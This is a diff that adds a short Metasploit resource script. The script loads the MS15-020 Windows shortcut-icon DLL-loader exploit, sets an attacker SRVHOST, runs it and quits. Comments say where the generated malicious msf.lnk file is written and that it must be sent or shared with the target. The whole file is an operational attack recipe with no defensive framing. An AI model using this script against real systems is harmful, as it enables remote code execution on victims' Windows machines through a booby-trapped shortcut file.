@@ -1,0 +1,9 @@
+# Set your LOCAL IP in SRVHOST
+
+use exploit/windows/smb/ms15_020_shortcut_icon_dllloader
+set SRVHOST 192.168.0.102
+run
+quit
+
+# msf.lnk stored at /root/.msf5/local/msf.lnk
+# The LNK file must be sent or shared with the target
